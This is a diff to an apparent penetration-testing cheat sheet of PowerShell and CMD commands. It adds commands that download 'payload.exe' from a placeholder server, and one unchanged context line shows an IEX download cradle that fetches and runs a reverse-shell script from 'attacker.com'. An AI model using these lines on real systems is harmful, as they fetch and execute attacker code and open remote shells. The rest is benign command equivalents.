@@ -1,4 +1,24 @@
-# PS cheats
+# PowerShell Movements
+
+## base64 some bytes
+
+```powershell
+[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
+```
+- works for anything that returns the bytes object
+
+## Pull via HTTP
+
+```powershell
+Invoke-WebRequest -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe 
+```
+
+```powershell
+iwr -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe 
+```
+
+# Old Sheet
+## PS cheats
 - put paths in quotes, because windows is bad !
 - get-Service NAME
 - Measure-Object										; for counting outputs
@@ -64,7 +84,7 @@ IEX(New-Object WebClient).downloadString("http://attacker.com/rev.ps1")
 
 
 
-# CMD cheats
+## CMD cheats
 - type 		== cat
 - findstr 	== grep
 - dir /a    == ls -a
